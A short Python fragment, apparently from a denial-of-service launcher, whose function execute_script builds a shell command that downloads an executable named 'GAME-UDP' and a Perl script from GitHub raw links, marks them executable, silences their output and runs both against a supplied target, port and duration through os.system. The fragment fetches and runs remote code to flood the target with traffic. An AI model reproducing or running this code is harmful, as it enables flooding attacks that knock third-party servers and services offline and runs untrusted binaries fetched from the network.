...
def execute_script(target, port, duration):
    ...
    command = f"cd .. && cd hvr && cd usr && wget https://github.com/urddos4807010/pakistan/raw/main/GAME-UDP > /dev/null 2>&1 && wget https://github.com/proxy807010/gaandmaarlungateri/raw/main/SamZGamerz.pl > /dev/null 2>&1 && chmod +x * && ./GAME-UDP {target} {port} {duration} 100 > /dev/null 2>&1 && perl SamZGamerz.pl {target} {port} {duration} 1000 rohan123 rohan123 > /dev/null 2>&1"
    os.system(command)
